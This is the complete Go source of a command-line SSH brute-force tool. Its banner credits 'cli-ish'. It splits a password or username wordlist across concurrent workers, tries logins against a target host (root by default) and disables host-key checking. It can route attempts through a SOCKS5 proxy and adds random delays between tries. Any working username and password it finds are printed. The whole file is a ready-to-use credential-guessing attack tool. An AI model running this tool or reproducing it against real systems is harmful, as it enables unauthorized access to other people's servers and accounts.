package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var sem = make(chan struct{}, 1)
var wg sync.WaitGroup
var operationDone = false
var globalproxy ProxySettings

type ProxySettings struct {
	ip       string
	port     int
	username string
	password string
}

func CustomDialTimeout(network, address string, timeout time.Duration, proxysetting ProxySettings) (net.Conn, error) {
	d := net.Dialer{Timeout: timeout}
	if proxysetting.ip == "" {
		return d.Dial(network, address)
	}
	if proxysetting.username != "" {
		auth := proxy.Auth{
			User:     proxysetting.username,
			Password: proxysetting.password,
		}
		dialSocksProxy, err := proxy.SOCKS5("tcp", proxysetting.ip+":"+strconv.Itoa(proxysetting.port), &auth, &d)
		if err != nil {
			return nil, err // todo: throw different error (rotate proxy because its not reachable)
		}
		return dialSocksProxy.Dial(network, address)
	}
	dialSocksProxy, err := proxy.SOCKS5("tcp", proxysetting.ip+":"+strconv.Itoa(proxysetting.port), nil, &d)
	if err != nil {
		return nil, err // todo: throw different error (rotate proxy because its not reachable)
	}
	return dialSocksProxy.Dial(network, address)
}

func CustomDial(network, addr string, config *ssh.ClientConfig, proxysetting ProxySettings) (*ssh.Client, error) {
	conn, err := CustomDialTimeout(network, addr, config.Timeout, proxysetting)
	if err != nil {
		return nil, err
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
	// todo Implement her the fail2ban check
	if err != nil {
		return nil, err
	}
	return ssh.NewClient(c, chans, reqs), nil
}

func sshlogin(addr string, username string, password string, timeout int64, proxysetting ProxySettings) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.HostKeyCallback(func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }),
		Timeout:         time.Duration(timeout * int64(time.Second)),
	}
	client, err := CustomDial("tcp", addr, config, proxysetting)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func runWordlistPart(addr string, list []string, username string, timeout int64, inverted bool) {
	time.Sleep(time.Duration(rand.Float64() * float64(time.Second)))
	for _, wordlistline := range list {
		time.Sleep(time.Duration(rand.Float64() * float64(time.Second) / 2))
		if operationDone {
			break
		}
		usr := username
		pwd := wordlistline
		if inverted {
			usr = wordlistline
			pwd = username // Not the best naming I know :D
		}
		if sshlogin(addr, usr, pwd, timeout, globalproxy) {
			fmt.Println("================================")
			fmt.Println(" Found working combo")
			fmt.Println(" Username: " + usr)
			fmt.Println(" Password: " + pwd)
			fmt.Println("================================")
			sem <- struct{}{}
			operationDone = true
			<-sem
			break
		}
	}
	sem <- struct{}{}
	wg.Done()
	<-sem
}

func readWordlist(filename string, workerCount int) ([][]string, int, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, 0, err
	}
	s := bufio.NewScanner(f)
	s.Split(bufio.ScanLines)
	var lines []string
	for s.Scan() {
		lines = append(lines, s.Text())
	}
	f.Close()
	linecount := len(lines)
	var result [][]string
	totallen := len(lines)
	partlength := int(len(lines) / workerCount)
	if partlength == 0 {
		return nil, 0, fmt.Errorf("Error while worker assigment: more or equal worker assigned than wordlist entries.")
	}
	count := 0
	for i := 0; i < totallen; i += partlength {
		customlen := partlength
		if i+customlen > totallen {
			customlen = totallen - i
		}
		result = append(result, lines[i:i+customlen])
		count++
	}
	return result, linecount, nil
}

func main() {
	addr := "127.0.0.1"
	port := 22
	username := "root"
	wordlistPath := "./smalllist.txt"
	workerCount := 10
	timeout := 3
	inverted := false
	globalproxy = ProxySettings{ip: "", port: 0}
	proxyaddr := ""
	proxycreds := ""

	rand.Seed(time.Now().UnixNano())
	flag.StringVar(&addr, "h", "127.0.0.1", "Specify Hostname or ip. Default is 127.0.0.1")
	flag.IntVar(&port, "p", 22, "Specify Port. Default is 22")
	flag.StringVar(&username, "u", "root", "Specify username or password (depends on inverted flag). Default is root")
	flag.IntVar(&workerCount, "c", 22, "Specify Worker count. Default is 10")
	flag.IntVar(&timeout, "t", 3, "Specify Timeout. Default is 3")
	flag.BoolVar(&inverted, "i", false, "Specify Inversion mode, bruteforce username with one password. Default is false")
	flag.StringVar(&wordlistPath, "w", "./smalllist.txt", "Specify wordlist. Default is ./smalllist.txt")
	flag.StringVar(&proxyaddr, "proxy", "", "Specify proxy in format ip:port. Default is no proxy usage")
	flag.StringVar(&proxycreds, "proxy-credentials", "", "Specify proxy credentials in format username:password. Default is empty")
	flag.Usage = func() {
		flag.PrintDefaults() // prints default usage
	}
	flag.Parse()
	pos := strings.Index(proxyaddr, ":")
	if pos != -1 {
		globalproxy.ip = proxyaddr[0:pos]
		portproxy, err := strconv.Atoi(proxyaddr[pos+1 : len(proxyaddr)])
		if err != nil {
			fmt.Println(" Error while parsing proxy. must be in format ip:port to be used!")
			os.Exit(1)
			return
		}
		globalproxy.port = portproxy
	}
	if globalproxy.ip != "" && proxycreds != "" {
		pos = strings.Index(proxycreds, ":")
		if pos != -1 {
			globalproxy.username = proxycreds[0:pos]
			globalproxy.password = proxycreds[pos+1 : len(proxycreds)]
		}
	}

	fmt.Println("                                                                                        ")
	fmt.Println("  _|_|_|_|  _|_|_|_|  _|    _|    _|_|_|    _|                                          ")
	fmt.Println("  _|        _|        _|    _|  _|        _|_|_|_|    _|_|    _|  _|_|  _|_|_|  _|_|    ")
	fmt.Println("  _|_|_|    _|_|_|    _|_|_|_|    _|_|      _|      _|    _|  _|_|      _|    _|    _|  ")
	fmt.Println("        _|        _|  _|    _|        _|    _|      _|    _|  _|        _|    _|    _|  ")
	fmt.Println("  _|_|_|    _|_|_|    _|    _|  _|_|_|        _|_|    _|_|    _|        _|    _|    _|  ")
	fmt.Println("                                                                                        ")
	fmt.Println(" Author: cli-ish                                                                        ")
	fmt.Println(" Target   : " + addr)
	fmt.Println(" Port     : " + strconv.Itoa(port))
	fmt.Println(" Timeout  : " + strconv.Itoa(timeout))
	fmt.Println(" username : " + username)
	fmt.Println(" workers  : " + strconv.Itoa(workerCount))
	fmt.Println(" wordlist : " + wordlistPath)
	fmt.Println(" Inverted : " + strconv.FormatBool(inverted))
	if globalproxy.ip != "" {
		fmt.Println(" ============= Proxy  ============= ")
		fmt.Println(" ip       : " + globalproxy.ip)
		fmt.Println(" port     : " + strconv.Itoa(globalproxy.port))
		if globalproxy.username != "" {
			fmt.Println(" username : " + globalproxy.username)
			fmt.Println(" password : " + globalproxy.password)
		}
		fmt.Println(" ============= Proxy  ============= ")
	}
	fmt.Println(" Type -h for help")
	fmt.Println()
	target := addr + ":" + strconv.Itoa(port)
	fmt.Println(" Load Wordlist: " + wordlistPath)
	wordlists, linecount, err := readWordlist(wordlistPath, workerCount)
	if err != nil {
		fmt.Println(" Wordlist could not be found!")
		os.Exit(1)
		return
	}
	wg.Add(workerCount)
	fmt.Println(" Start " + strconv.Itoa(workerCount) + " wordlist workers...")
	for _, wordlist := range wordlists {
		go runWordlistPart(target, wordlist, username, int64(timeout), inverted)
	}
	fmt.Println(" Started you can now get some coffee")
	now := time.Now()
	fmt.Println(" Start time: " + now.Format("01-02-2006 15:04:05"))
	halfway := now.Add(time.Duration(((timeout*linecount)/2)/workerCount) * time.Second)
	fmt.Println(" Halfway wait-time possible: " + halfway.Format("01-02-2006 15:04:05"))
	fullwait := now.Add(time.Duration((timeout*linecount)/workerCount) * time.Second)
	fmt.Println(" Longest wait-time possible: " + fullwait.Format("01-02-2006 15:04:05"))
	wg.Wait()
	fmt.Println(" Done with the working!")
	now = time.Now()
	fmt.Println(" End time: " + now.Format("01-02-2006 15:04:05"))
	return
}
